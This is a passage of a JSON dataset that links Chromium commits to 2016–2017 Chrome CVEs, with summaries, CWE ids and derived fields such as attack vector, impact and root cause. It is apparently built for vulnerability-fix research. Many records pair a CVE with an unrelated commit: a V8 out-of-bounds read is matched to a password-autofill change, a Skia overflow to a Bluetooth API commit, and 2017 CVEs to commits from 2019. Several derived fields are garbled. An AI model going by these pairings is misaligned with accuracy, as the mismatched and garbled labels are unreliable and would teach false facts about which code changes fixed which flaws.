mode.\n\nThis CL just reverted some changes that were made in\nhttps:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1658955. In\nthat CL, we changed the clamshell <-> tablet transition when clamshell\nsplit view mode is enabled, however, we should keep the old behavior\nunchanged if the feature is not enabled, i.e., overview should be ended\nif it's active before the transition. Otherwise, it will cause a nullptr\ndereference crash since |split_view_drag_indicators_| is not created in\nclamshell overview and will be used in tablet overview.\n\nBug: 982507\nChange-Id: I238fe9472648a446cff4ab992150658c228714dd\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1705474\nCommit-Queue: Xiaoqian Dai <xdai@chromium.org>\nReviewed-by: Mitsuru Oshima (Slow - on\/off site) <oshima@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#679306}","summary":"Incorrect handling of picture ID in WebRTC in Google Chrome prior to 58.0.3029.96 for Mac, Windows, and Linux allowed a remote attacker to trigger a race condition via a crafted HTML page.","commit_message_1":"fix the crash after clamshell - > tablet transition in overview mode","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted html page","Impact":"trigger a race condition","Root Cause":"caused by an error related to Blink","Attack Type":"remote attacker"},{"commit_id":"746da1cc6b2fbc2f725934542eedc49b41e5f17b","cve_id":"CVE-2017-5055","cwe_id":"CWE-125","commit_message":"Properly clean up in PrintViewManager::RenderFrameCreated().\n\nBUG=694382,698622\n\nReview-Url: https:\/\/codereview.chromium.org\/2742853003\nCr-Commit-Position: refs\/heads\/master@{#457363}","summary":"A use after free in printing in Google Chrome prior to 57.0.2987.133 for Linux and Windows allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"properly clean up in printviewmanager : :renderframecreated ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"e72c8c06b956706b54648589f807086d17340831","cve_id":"CVE-2017-5052","cwe_id":"CWE-119","commit_message":"Search the entire subtree when looking for the end of an inline continuation chain.\n\nInlines may be nested, so we may not find the last inline in the chain as a\ndirect child of the anonymous blocks. We need to search the entire subtree.\nDon't do this with anonymous blocks that wrap block children (the block-level\nDOM children of the inline-level objects), though. We're not going to find\nanything interesting there.\n\nThis fix is speculative; the original bug report didn't come with a test case.\n\nBUG=662767\n\nReview-Url: https:\/\/codereview.chromium.org\/2738503004\nCr-Commit-Position: refs\/heads\/master@{#455420}","summary":"An incorrect assumption about block structure in Blink in Google Chrome prior to 57.0.2987.133 for Mac, Windows, and Linux, and 57.0.2987.132 for Android, allowed a remote attacker to potentially exploit memory corruption via a crafted HTML page that triggers improper casting.","commit_message_1":"search the entire subtree when looking for the end of an inline continuation chain","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page that triggers improper casting","Impact":"potentially exploit memory corruption","Root Cause":"caused by a bad cast","Attack Type":"remote attacker"},{"commit_id":"2ad6b02cbf13d8f9dce50340e966ba413cb66b1c","cve_id":"CVE-2017-5056","cwe_id":"CWE-125","commit_message":"ime-service: Delete InputEngine.ProcessText.\n\nIt is deprecated and no longer used.\n\nBug: 1009903\nChange-Id: I6774a4506bd0bb41a5d1a5909a40a2a781564b16\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1833029\nAuto-Submit: Darren Shen <shend@chromium.org>\nReviewed-by: Chris Palmer <palmer@chromium.org>\nReviewed-by: Keith Lee <keithlee@chromium.org>\nReviewed-by: Shu Chen <shuchen@chromium.org>\nCommit-Queue: Darren Shen <shend@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#705445}","summary":"A use after free in Blink in Google Chrome prior to 57.0.2987.133 for Linux, Windows, and Mac, and 57.0.2987.132 for Android, allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"delete <file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"5c895ed26b096468eea6baa6584f2df65905b76b","cve_id":"CVE-2017-5053","cwe_id":"CWE-125","commit_message":"[Android][TouchToFill] Use FindPasswordInfoForElement for triggering\n\nUse for TouchToFill the same triggering logic that is used for regular\nsuggestions.\n\nBug: 1010233\nChange-Id: I111d4eac4ce94dd94b86097b6b6c98e08875e11a\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1834230\nCommit-Queue: Boris Sazonov <bsazonov@chromium.org>\nReviewed-by: Vadym Doroshenko <dvadym@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#702058}","summary":"An out-of-bounds read in V8 in Google Chrome prior to 57.0.2987.133 for Linux, Windows, and Mac, and 57.0.2987.132 for Android, allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page, related to Array.prototype.indexOf.","commit_message_1":"[ touchtofill ] use findpasswordinfoforelement for triggering use for touchtofill the same triggering logic that is used for regular suggestion","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted html page","Impact":"execute arbitrary code inside a sandbox","Root Cause":"caused by an out-of-bounds memory access","Attack Type":"remote attacker"},{"commit_id":"9c90f2cec381a0460e3879eb8efd14bac4488dbe","cve_id":"CVE-2017-5032","cwe_id":"CWE-787","commit_message":"Ignore updatePipBounds before initial bounds is set\n\nWhen PIP enter\/exit transition happens, window state change and\ninitial bounds change are committed in the same commit. However,\nas state change is applied first in OnPreWidgetCommit and the\nbounds is update later, if updatePipBounds is called between the\ngap, it ends up returning a wrong bounds based on the previous\nbounds.\n\nCurrently, there are two callstacks that end up triggering\nupdatePipBounds between the gap: (i) The state change causes\nOnWindowAddedToLayout and updatePipBounds is called in OnWMEvent,\n(ii) updatePipBounds is called in UpdatePipState to prevent it\nfrom being placed under some system ui.\n\nAs it doesn't make sense to call updatePipBounds before the first\nbounds is not set, this CL adds a boolean to defer updatePipBounds.\n\nposition.\n\nBug: b130782006\nTest: Got VLC into PIP and confirmed it was placed at the correct\nChange-Id: I5b9f3644bfb2533fd3f905bc09d49708a5d08a90\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1578719\nCommit-Queue: Kazuki Takise <takise@chromium.org>\nAuto-Submit: Kazuki Takise <takise@chromium.org>\nReviewed-by: Mitsuru Oshima <oshima@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#668724}","summary":"PDFium in Google Chrome prior to 57.0.2987.98 for Windows could be made to increment off the end of a buffer, which allowed a remote attacker to potentially exploit heap corruption via a crafted PDF file.","commit_message_1":"ignore updatepipbounds before initial bound is set when pip enter\/exit transition happens , window state change and initial bound change are committed in the same commit","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted pdf file","Impact":"potentially exploit heap corruption","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"c32cd2069ae8062b52e5b7b1faf5936bd71a583a","cve_id":"CVE-2017-5035","cwe_id":"CWE-362","commit_message":"Add DumpWithoutCrashing in RendererDidNavigateToExistingPage\n\nThis is intended to be reverted after investigating the linked bug.\n\nBUG=688425\nCQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_site_isolation\n\nReview-Url: https:\/\/codereview.chromium.org\/2701523004\nCr-Commit-Position: refs\/heads\/master@{#450900}","summary":"Google Chrome prior to 57.0.2987.98 for Windows and Mac had a race condition, which could cause Chrome to display incorrect certificate information for a site.","commit_message_1":"add dumpwithoutcrashing in rendererdidnavigatetoexistingpage this is intended to be reverted after investigating the linked bug","Vulnerability Type":"Race Condition","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"display incorrect certificate information for a site","Root Cause":"caused by incorrect security UI","Attack Type":"remote attacker"},{"commit_id":"61033ac5120da29aea6db205f5157d679c49edfc","cve_id":"CVE-2017-5036","cwe_id":"CWE-416","commit_message":"Add reporting for DLP deep scanning\n\nFor each triggered rule in the DLP response, we report the download as\nviolating that rule.\n\nThis also implements the UnsafeReportingEnabled enterprise policy, which\ncontrols whether or not we do any reporting.\n\nBug: 980777\nChange-Id: I48100cfb4dd5aa92ed80da1f34e64a6e393be2fa\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1772381\nCommit-Queue: Daniel Rubery <drubery@chromium.org>\nReviewed-by: Karan Bhatia <karandeepb@chromium.org>\nReviewed-by: Roger Tawa <rogerta@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#691371}","summary":"A use after free in PDFium in Google Chrome prior to 57.0.2987.98 for Mac, Windows, and Linux and 57.0.2987.108 for Android allowed a remote attacker to have an unspecified impact via a crafted PDF file.","commit_message_1":"add reporting for dlp deep scanning for each triggered rule in the dlp response , we report the download a violating that rule","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted pdf file","Impact":"have an unspecified impact","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"69b4b9ef7455753b12c3efe4eec71647e6fb1da1","cve_id":"CVE-2017-5039","cwe_id":"CWE-416","commit_message":"Disable all DRP URL fetches when holdback is enabled\n\nDisable secure proxy checker, warmup url fetcher\nand client config fetch when the client is in DRP\n(Data Reduction Proxy) holdback.\n\nThis CL does not disable pingbacks when client is in the\nholdback, but the pingback code is going away soon.\n\nChange-Id: Icbb59d814d1452123869c609e0770d1439c1db51\nBug: 984964\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1709965\nCommit-Queue: Tarun Bansal <tbansal@chromium.org>\nReviewed-by: Robert Ogden <robertogden@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#679649}","summary":"A use after free in PDFium in Google Chrome prior to 57.0.2987.98 for Mac, Windows, and Linux and 57.0.2987.108 for Android allowed a remote attacker to potentially exploit heap corruption via a crafted PDF file.","commit_message_1":"disable all drp url fetch when holdback is enabled disable secure proxy checker , warmup url fetcher and client config fetch when the client is in drp ( data reduction proxy ) holdback","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted pdf file","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"14f2111f9cec919a450115ce4914f228effca58e","cve_id":"CVE-2017-5033","cwe_id":"CWE-281","commit_message":"Revert \"Add explicit flag for compositor scrollbar injected gestures\"\n\nThis reverts commit d9a56afcbdf9850bc39bb3edb56d07d11a1eb2b2.\n\nReason for revert:\n\nFindit (https:\/\/goo.gl\/kROfz5) identified CL at revision 669086 as the\nculprit for flakes in the build cycles as shown on:\nhttps:\/\/analysis.chromium.org\/p\/chromium\/flake-portal\/analysis\/culprit?key=ag9zfmZpbmRpdC1mb3ItbWVyQwsSDEZsYWtlQ3VscHJpdCIxY2hyb21pdW0vZDlhNTZhZmNiZGY5ODUwYmMzOWJiM2VkYjU2ZDA3ZDExYTFlYjJiMgw\n\nSample Failed Build: https:\/\/ci.chromium.org\/buildbot\/chromium.chromiumos\/linux-chromeos-rel\/25818\n\nSample Failed Step: content_browsertests on Ubuntu-16.04\n\nSample Flaky Test: ScrollLatencyScrollbarBrowserTest.ScrollbarThumbDragLatency\n\nOriginal change's description:\n> Add explicit flag for compositor scrollbar injected gestures\n> \n> The original change to enable scrollbar latency for the composited\n> scrollbars incorrectly used an existing member to try and determine\n> whether a GestureScrollUpdate was the first one in an injected sequence\n> or not. is_first_gesture_scroll_update_ was incorrect because it is only\n> updated when input is actually dispatched to InputHandlerProxy, and the\n> flag is cleared for all GSUs before the location where it was being\n> read.\n> \n> This bug was missed because of incorrect tests. The\n> VerifyRecordedSamplesForHistogram method doesn't actually assert or\n> expect anything - the return value must be inspected.\n> \n> As part of fixing up the tests, I made a few other changes to get them\n> passing consistently across all platforms:\n> - turn on main thread scrollbar injection feature (in case it's ever\n>   turned off we don't want the tests to start failing)\n> - enable mock scrollbars\n> - disable smooth scrolling\n> - don't run scrollbar tests on Android\n> \n> The composited scrollbar button test is disabled due to a bug in how\n> the mock theme reports its button sizes, which throws off the region\n> detection in ScrollbarLayerImplBase::IdentifyScrollbarPart (filed\n> crbug.com\/974063 for this issue).\n> \n> Change-Id: Ie1a762a5f6ecc264d22f0256db68f141fc76b950\n> \n> Bug: 954007\n> Change-Id: Ib258e08e083e79da90ba2e4e4216e4879cf00cf7\n> Reviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1652741\n> Commit-Queue: Daniel Libby <dlibby@microsoft.com>\n> Reviewed-by: David Bokan <bokan@chromium.org>\n> Cr-Commit-Position: refs\/heads\/master@{#669086}\n\n\nChange-Id: Icc743e48fa740fe27f0cb0cfa21b209a696f518c\nNo-Presubmit: true\nNo-Tree-Checks: true\nNo-Try: true\nBug: 954007\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1660114\nCr-Commit-Position: refs\/heads\/master@{#669150}","summary":"Blink in Google Chrome prior to 57.0.2987.98 for Mac, Windows, and Linux and 57.0.2987.108 for Android failed to correctly propagate CSP restrictions to local scheme pages, which allowed a remote attacker to bypass content security policy via a crafted HTML page, related to the unsafe-inline keyword.","commit_message_1":"revert `` add explicit flag for compositor scrollbar injected gesture '' this reverts commit d9a56afcbdf9850bc39bb3edb56d07d11a1eb2b2","Vulnerability Type":"Improper Preservation of Permissions","Attack Vector":"via a crafted html page , related to the unsafe - inline keyword","Impact":"bypass content security policy","Root Cause":"to correctly propagate csp restrictions to local scheme pages","Attack Type":"remote attacker"},{"commit_id":"7cde8513c12a6e8ec5d1d1eb1cfd078d9adad3ef","cve_id":"CVE-2017-5042","cwe_id":"CWE-311","commit_message":"Revert \"PageInfo: decouple safe browsing and TLS statii.\"\n\nThis reverts commit ee95bc44021230127c7e6e9a8cf9d3820760f77c.\n\nReason for revert: suspect causing unit_tests failure on Linux MSAN Tests:\nhttps:\/\/ci.chromium.org\/p\/chromium\/builders\/ci\/Linux%20MSan%20Tests\/17649\nPageInfoBubbleViewTest.ChangingFlashSettingForSiteIsRemembered\nPageInfoBubbleViewTest.EnsureCloseCallback\nPageInfoBubbleViewTest.NotificationPermissionRevokeUkm\nPageInfoBubbleViewTest.OpenPageInfoBubbleAfterNavigationStart\nPageInfoBubbleViewTest.SetPermissionInfo\nPageInfoBubbleViewTest.SetPermissionInfoForUsbGuard\nPageInfoBubbleViewTest.SetPermissionInfoWithPolicyUsbDevices\nPageInfoBubbleViewTest.SetPermissionInfoWithUsbDevice\nPageInfoBubbleViewTest.SetPermissionInfoWithUserAndPolicyUsbDevices\nPageInfoBubbleViewTest.UpdatingSiteDataRetainsLayout\n\nhttps:\/\/logs.chromium.org\/logs\/chromium\/buildbucket\/cr-buildbucket.appspot.com\/8909718923797040064\/+\/steps\/unit_tests\/0\/logs\/Deterministic_failure:_PageInfoBubbleViewTest.ChangingFlashSettingForSiteIsRemembered__status_CRASH_\/0\n\n[ RUN      ] PageInfoBubbleViewTest.ChangingFlashSettingForSiteIsRemembered\n==9056==WARNING: MemorySanitizer: use-of-uninitialized-value\n    #0 0x561baaab15ec in PageInfoUI::GetSecurityDescription(PageInfoUI::IdentityInfo const&) const .\/..\/..\/chrome\/browser\/ui\/page_info\/page_info_ui.cc:250:3\n    #1 0x561bab6a1548 in PageInfoBubbleView::SetIdentityInfo(PageInfoUI::IdentityInfo const&) .\/..\/..\/chrome\/browser\/ui\/views\/page_info\/page_info_bubble_view.cc:802:7\n    #2 0x561baaaab3bb in PageInfo::PresentSiteIdentity() .\/..\/..\/chrome\/browser\/ui\/page_info\/page_info.cc:969:8\n    #3 0x561baaaa0a21 in PageInfo::PageInfo(PageInfoUI*, Profile*, TabSpecificContentSettings*, content::WebContents*, GURL const&, security_state::SecurityLevel, security_state::VisibleSecurityState const&) .\/..\/..\/chrome\/browser\/ui\/page_info\/page_info.cc:344:3\n    #4 0x561bab69b6dd in PageInfoBubbleView::PageInfoBubbleView(views::View*, gfx::Rect const&, aura::Window*, Profile*, content::WebContents*, GURL const&, security_state::SecurityLevel, security_state::VisibleSecurityState const&, base::OnceCallback<void (views::Widget::ClosedReason, bool)>) .\/..\/..\/chrome\/browser\/ui\/views\/page_info\/page_info_bubble_view.cc:576:24\n...\n\nOriginal change's description:\n> PageInfo: decouple safe browsing and TLS statii.\n> \n> Previously, the Page Info bubble maintained a single variable to\n> identify all reasons that a page might have a non-standard status. This\n> lead to the display logic making assumptions about, for instance, the\n> validity of a certificate when the page was flagged by Safe Browsing.\n> \n> This CL separates out the Safe Browsing status from the site identity\n> status so that the page info bubble can inform the user that the site's\n> certificate is invalid, even if it's also flagged by Safe Browsing.\n> \n> Bug: 869925\n> Change-Id: I34107225b4206c8f32771ccd75e9367668d0a72b\n> Reviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1662537\n> Reviewed-by: Mustafa Emre Acer <meacer@chromium.org>\n> Reviewed-by: Bret Sepulveda <bsep@chromium.org>\n> Auto-Submit: Joe DeBlasio <jdeblasio@chromium.org>\n> Commit-Queue: Joe DeBlasio <jdeblasio@chromium.org>\n> Cr-Commit-Position: refs\/heads\/master@{#671847}\n\nTBR=meacer@chromium.org,bsep@chromium.org,jdeblasio@chromium.org\n\nChange-Id: I8be652952e7276bcc9266124693352e467159cc4\nNo-Presubmit: true\nNo-Tree-Checks: true\nNo-Try: true\nBug: 869925\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1673985\nReviewed-by: Takashi Sakamoto <tasak@google.com>\nCommit-Queue: Takashi Sakamoto <tasak@google.com>\nCr-Commit-Position: refs\/heads\/master@{#671932}","summary":"Cast in Google Chrome prior to 57.0.2987.98 for Mac, Windows, and Linux and 57.0.2987.108 for Android sent cookies to sites discovered via SSDP, which allowed an attacker on the local network segment to initiate connections to arbitrary URLs and observe any plaintext cookies sent.","commit_message_1":"decouple safe browsing and tl statii","Vulnerability Type":"Missing Encryption of Sensitive Data","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"initiate connections to arbitrary urls and observe any plaintext cookies sent ","Root Cause":"cookies to sites discovered via ssdp","Attack Type":"local attacker"},{"commit_id":"62154472bd2c43e1790dd1bd8a527c1db9118d88","cve_id":"CVE-2017-5044","cwe_id":"CWE-119","commit_message":"bluetooth: Implement getAvailability()\n\nThis change implements the getAvailability() method for\nnavigator.bluetooth as defined in the specification.\n\nBug: 707640\nChange-Id: I9e9b3e7f8ea7f259e975f71cb6d9570e5f04b479\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1651516\nReviewed-by: Chris Harrelson <chrishtr@chromium.org>\nReviewed-by: Giovanni Ortu\u00f1o Urquidi <ortuno@chromium.org>\nReviewed-by: Kinuko Yasuda <kinuko@chromium.org>\nCommit-Queue: Ovidio de Jes\u00fas Ruiz-Henr\u00edquez <odejesush@chromium.org>\nAuto-Submit: Ovidio de Jes\u00fas Ruiz-Henr\u00edquez <odejesush@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#688987}","summary":"Heap buffer overflow in filter processing in Skia in Google Chrome prior to 57.0.2987.98 for Mac, Windows, and Linux and 57.0.2987.108 for Android allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"implement getavailability ( ) this change implement the getavailability ( ) method for <file> a defined in the specification","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by improper bounds checking by Skia","Attack Type":"remote attacker"},{"commit_id":"eea3300239f0b53e172a320eb8de59d0bea65f27","cve_id":"CVE-2017-5011","cwe_id":"CWE-200","commit_message":"DevTools: move front-end URL handling to DevToolsUIBindingds\n\nBUG=662859\n\nReview-Url: https:\/\/codereview.chromium.org\/2607833002\nCr-Commit-Position: refs\/heads\/master@{#440926}","summary":"Google Chrome prior to 56.0.2924.76 for Windows insufficiently sanitized DevTools URLs, which allowed a remote attacker who convinced a user to install a malicious extension to read filesystem contents via a crafted HTML page.","commit_message_1":"devtools : move front-end url handling to devtoolsuibindingds","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"install a malicious extension to read filesystem contents","Root Cause":"insufficiently sanitized DevTools URLs","Attack Type":"remote attacker"},{"commit_id":"1c40f9042ae2d6ee7483d72998aabb5e73b2ff60","cve_id":"CVE-2017-5009","cwe_id":"CWE-119","commit_message":"DevTools: send proper resource type in Network.RequestWillBeSent\n\nThis patch plumbs resoure type into the DispatchWillSendRequest\ninstrumenation. This allows us to report accurate type in\nNetwork.RequestWillBeSent event, instead of \"Other\", that we report\ntoday.\n\nBUG=765501\nR=dgozman\n\nChange-Id: I0134c08b841e8dd247fdc8ff208bfd51e462709c\nReviewed-on: https:\/\/chromium-review.googlesource.com\/667504\nReviewed-by: Pavel Feldman <pfeldman@chromium.org>\nReviewed-by: Dmitry Gozman <dgozman@chromium.org>\nCommit-Queue: Andrey Lushnikov <lushnikov@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#507936}","summary":"WebRTC in Google Chrome prior to 56.0.2924.76 for Linux, Windows and Mac, and 56.0.2924.87 for Android, failed to perform proper bounds checking, which allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"send proper resource type in <file> this patch plumb resoure type into the dispatchwillsendrequest instrumenation","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"failed to perform proper bounds checking","Attack Type":"remote attacker"},{"commit_id":"5b51043c7c8e7e6b86e68e6d93d95ad24e11cf0e","cve_id":"CVE-2017-5012","cwe_id":"CWE-119","commit_message":"[Payments] Prohibit opening payments UI in background tab.\n\nBefore this patch, calling PaymentRequest.show() would bring the\nbackground window to the foreground, which allows a page to open a\npop-under.\n\nThis patch adds a check for the browser window being active (in\nforeground) in PaymentRequest.show(). If the window is not active (in\nbackground), then PaymentRequest.show() promise is rejected with\n\"AbortError: User cancelled request.\" No UI is shown in that case.\n\nAfter this patch, calling PaymentRequest.show() does not bring the\nbackground window to the foreground, thus preventing opening a pop-under.\n\nBug: 768230\nChange-Id: I2b90f9086ceca5ed7b7bdf8045e44d7e99d566d0\nReviewed-on: https:\/\/chromium-review.googlesource.com\/681843\nReviewed-by: anthonyvd <anthonyvd@chromium.org>\nCommit-Queue: Rouslan Solomakhin <rouslan@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#504406}","summary":"A heap buffer overflow in V8 in Google Chrome prior to 56.0.2924.76 for Linux, Windows and Mac, and 56.0.2924.87 for Android, allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"prohibit opening payment ui in background tab","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"A heap buffer overflow","Attack Type":"remote attacker"},{"commit_id":"8f3a9a68b2dcdd2c54cf49a41ad34729ab576702","cve_id":"CVE-2017-5013","cwe_id":null,"commit_message":"Don't focus the location bar for NTP navigations in non-selected tabs.\n\nBUG=677716\nTEST=See bug for repro steps.\n\nReview-Url: https:\/\/codereview.chromium.org\/2624373002\nCr-Commit-Position: refs\/heads\/master@{#443338}","summary":"Google Chrome prior to 56.0.2924.76 for Linux incorrectly handled new tab page navigations in non-selected tabs, which allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"do n't focus the location bar for ntp navigation in non-selected tab","Vulnerability Type":"unspecified","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"35eb28748d45b87695a69eceffaff73a0be476af","cve_id":"CVE-2017-5014","cwe_id":"CWE-119","commit_message":"Remove unused histograms from the background loader offliner.\n\nBug: 975512\nChange-Id: I87b0a91bed60e3a9e8a1fd9ae9b18cac27a0859f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1683361\nReviewed-by: Cathy Li <chili@chromium.org>\nReviewed-by: Steven Holte <holte@chromium.org>\nCommit-Queue: Peter Williamson <petewil@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#675332}","summary":"Heap buffer overflow during image processing in Skia in Google Chrome prior to 56.0.2924.76 for Linux, Windows and Mac, and 56.0.2924.87 for Android, allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"remove unused histogram from the background loader offliner","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by improper bounds checking by Skia","Attack Type":"remote attacker"},{"commit_id":"f03ea5a5c2ff26e239dfd23e263b15da2d9cee93","cve_id":"CVE-2017-5019","cwe_id":"CWE-416","commit_message":"Convert FrameHostMsg_DidAddMessageToConsole to Mojo.\n\nNote: Since this required changing the test\nRenderViewImplTest.DispatchBeforeUnloadCanDetachFrame, I manually\nre-introduced https:\/\/crbug.com\/666714 locally (the bug the test was\nadded for), and reran the test to confirm that it still covers the bug.\n\nBug: 786836\nChange-Id: I110668fa6f0f261fd2ac36bb91a8d8b31c99f4f1\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1526270\nCommit-Queue: Lowell Manners <lowell@chromium.org>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nReviewed-by: Camille Lamy <clamy@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#653137}","summary":"A use after free in Google Chrome prior to 56.0.2924.76 for Linux, Windows and Mac, and 56.0.2924.87 for Android, allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"since this required changing the test <file> , i manually re-introduced http : \/\/<file>\/<number> locally ( the bug the test wa added for ) , and reran the test to confirm that it still cover the bug","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"a8e17a3031b6ad69c399e5e04dd0084e577097fc","cve_id":"CVE-2017-5016","cwe_id":"CWE-1021","commit_message":"Form validation: Do not show validation bubble if the page is invisible.\n\nBUG=673163\n\nReview-Url: https:\/\/codereview.chromium.org\/2572813003\nCr-Commit-Position: refs\/heads\/master@{#438476}","summary":"Blink in Google Chrome prior to 56.0.2924.76 for Linux, Windows and Mac, and 56.0.2924.87 for Android, failed to prevent certain UI elements from being displayed by non-visible pages, which allowed a remote attacker to show certain UI elements on a page they don't control via a crafted HTML page.","commit_message_1":"do not show validation bubble if the page is invisible","Vulnerability Type":"Improper Restriction of Rendered UI Layers or Frames","Attack Vector":"via a crafted html page","Impact":"spoof the UI","Root Cause":"to prevent certain ui elements from being displayed by non - visible pages","Attack Type":"remote attacker"},{"commit_id":"03c2e97746a2c471ae136b0c669f8d0c033fe168","cve_id":"CVE-2017-5023","cwe_id":"CWE-476","commit_message":"Convert DCHECKs to CHECKs for histogram types\n\nWhen a histogram is looked up by name, there is currently a DCHECK that\nverifies the type of the stored histogram matches the expected type.\n\nA mismatch represents a significant problem because the returned\nHistogramBase is cast to a Histogram in ValidateRangeChecksum,\npotentially causing a crash.\n\nThis CL converts the DCHECK to a CHECK to prevent the possibility of\ntype confusion in release builds.\n\nBUG=651443\nR=isherman@chromium.org\n\nReview-Url: https:\/\/codereview.chromium.org\/2381893003\nCr-Commit-Position: refs\/heads\/master@{#421929}","summary":"Type confusion in Histogram in Google Chrome prior to 56.0.2924.76 for Linux, Windows and Mac, and 56.0.2924.87 for Android, allowed a remote attacker to potentially exploit a near null dereference via a crafted HTML page.","commit_message_1":"convert dchecks to check for histogram type when a histogram is looked up by name , there is currently a dcheck that verifies the type of the stored histogram match the expected type","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted html page","Impact":"execute arbitrary code","Root Cause":"caused by a type confusion","Attack Type":"remote attacker"},{"commit_id":"a7a4c17843aac24470943630137e6f4a4822203f","cve_id":"CVE-2016-5206","cwe_id":"CWE-284","commit_message":"[BGPT] Add a fast-path for transform-origin changes.\n\nThis patch adds a fast-path for updating composited transform-origin\nchanges without requiring a PaintArtifactCompositor update. This\nclosely follows the approach of https:\/\/crrev.com\/651338.\n\nBug: 952473\nChange-Id: I8b82909c1761a7aa16705813207739d29596b0d0\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1580260\nCommit-Queue: Philip Rogers <pdr@chromium.org>\nAuto-Submit: Philip Rogers <pdr@chromium.org>\nReviewed-by: vmpstr <vmpstr@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#653749}","summary":"The PDF plugin in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android incorrectly followed redirects, which allowed a remote attacker to bypass the Same Origin Policy via a crafted HTML page.","commit_message_1":"add a fast-path for transform-origin change","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted html page","Impact":"bypass the same origin policy","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"e1e67d5d341d82c61cab2c41ff4163f17caf14ae","cve_id":"CVE-2016-5204","cwe_id":"CWE-79","commit_message":"Add boolean to UserIntiatedInfo noting if an input event led to navigation.\n\nAlso refactor UkmPageLoadMetricsObserver to use this new boolean to\nreport the user initiated metric in RecordPageLoadExtraInfoMetrics, so\nthat it works correctly in the case when the page load failed.\n\nBug: 925104\nChange-Id: Ie08e7d3912cb1da484190d838005e95e57a209ff\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1450460\nCommit-Queue: Annie Sullivan <sullivan@chromium.org>\nReviewed-by: Bryan McQuade <bmcquade@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#630870}","summary":"Leaking of an SVG shadow tree leading to corruption of the DOM tree in Blink in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android allowed a remote attacker to 